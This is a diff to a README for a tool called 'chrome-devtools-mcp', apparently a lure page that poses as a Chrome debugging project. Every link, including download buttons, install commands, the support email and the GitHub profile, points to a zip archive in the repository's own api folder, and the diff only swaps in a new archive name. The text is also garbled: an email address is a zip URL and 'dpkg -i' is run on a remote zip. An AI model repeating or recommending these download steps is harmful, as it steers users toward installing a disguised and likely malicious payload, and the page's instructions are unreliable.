@@ -1,6 +1,6 @@
 # 🚀 chrome-devtools-mcp - Simplify Your Chrome Debugging Process
 
-[![Download Latest Release](https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip%20Latest%https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip)](https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip)
+[![Download Latest Release](https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip%20Latest%https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip)](https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To begin using chrome-devtools-mcp, follow these detailed steps:
    
    Go to the Releases page to get the latest version of chrome-devtools-mcp. Click the link below:
 
-   [Visit this page to download](https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip)
+   [Visit this page to download](https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip)
 
 2. **Choose Your Version**
    
@@ -26,7 +26,7 @@ To begin using chrome-devtools-mcp, follow these detailed steps:
 
    - **Windows**: Look for a `.exe` file.
    - **macOS**: Look for a `.dmg` file.
-   - **Linux**: Look for a `https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip` or a `.deb` file.
+   - **Linux**: Look for a `https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip` or a `.deb` file.
 
    Click on the file to start the download.
 
@@ -48,13 +48,13 @@ To begin using chrome-devtools-mcp, follow these detailed steps:
 
 ### Linux
 
-1. If you downloaded a `https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip` file, extract it first.
+1. If you downloaded a `https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip` file, extract it first.
 2. Open a terminal window.
 3. Change to the directory where you extracted the files.
 4. If you downloaded a `.deb` file, run the following command to install it:
 
    ```
-   sudo dpkg -i https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip
+   sudo dpkg -i https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip
    ```
 
 5. Once installed, you can run the application from your applications menu or terminal.
@@ -105,11 +105,11 @@ For additional help or to share feedback, consider reaching out to our community
 
 If you need direct support, feel free to contact the maintainers:
 
-- Email: https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip
-- GitHub: [bklamheem](https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip)
+- Email: https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip
+- GitHub: [bklamheem](https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip)
 
 ## 🔗 Final Notes
 
 You can always return to the Releases page for updates. Regularly check for new versions to benefit from improvements and new features:
 
-[Visit this page to download](https://raw.githubusercontent.com/bklamheem/chrome-devtools-mcp/main/api/devtools-mcp-chrome-v2.6.zip)
+[Visit this page to download](https://github.com/bklamheem/chrome-devtools-mcp/raw/refs/heads/main/api/mcp-devtools-chrome-2.3-alpha.4.zip)
